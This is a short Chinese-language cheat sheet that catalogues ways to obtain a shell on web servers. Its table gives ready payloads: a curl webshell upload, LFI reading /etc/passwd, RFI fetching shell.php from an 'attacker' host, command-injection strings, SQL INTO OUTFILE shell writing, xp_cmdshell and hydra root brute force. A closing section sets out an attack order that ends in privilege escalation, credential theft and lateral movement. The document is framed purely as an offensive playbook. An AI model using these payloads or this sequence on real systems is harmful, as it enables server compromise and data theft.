# Web Getshell 方法总览

| 类别 | 方法 | 典型目标 | 示例 |
|---|---|---|---|
| 文件上传 | 直接上传 WebShell | PHP / ASP / JSP | `curl -F "file=@shell.php" http://target/upload` |
| 文件上传 | 双扩展名 / MIME 绕过 | PHP | `shell.php.jpg`、`Content-Type: image/png` |
| 文件包含 | LFI | PHP | `page.php?file=../../../../etc/passwd` |
| 文件包含 | 日志包含 | PHP | 将 PHP 代码写入访问日志后包含日志文件 |
| 文件包含 | RFI | PHP | `page.php?file=http://attacker/shell.php` |
| 命令执行 | 直接命令 / 反弹 Shell | Linux / Windows | `; id`、`&& whoami`、Bash / PowerShell 反弹 |
| SQL 注入 | 写文件 | MySQL | `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` |
| SQL 注入 | `xp_cmdshell` | MSSQL | `EXEC xp_cmdshell 'whoami'` |
| SSTI | 模板注入 | Jinja2 / Twig / FreeMarker | 读取全局对象并调用系统命令 |
| SSRF | 打内网 / Redis | Web / Redis | 通过 Gopher 构造 Redis 写文件 |
| XXE | 文件读取 / SSRF | XML | 外部实体读取文件或请求内网 |
| 反序列化 | Gadget 链 | PHP / Java / Python | `ysoserial`、`phpggc`、Pickle 构造 |
| 日志污染 | Log Poisoning | LFI + 日志 | 将 payload 写入 User-Agent 或访问日志 |
| 弱口令 | 服务登录 | SSH / FTP / DB | `hydra -l root -P pass.txt ssh://target` |

## 选择顺序

1. 先确认已有入口漏洞：上传、包含、RCE、SQLi、SSTI、反序列化。
2. 选择最短落地方式：直接执行 → 写文件 → 文件包含 → 内存马。
3. 无法写 Web 目录时优先反弹 Shell。
4. Getshell 后再处理提权、凭据和横向移动。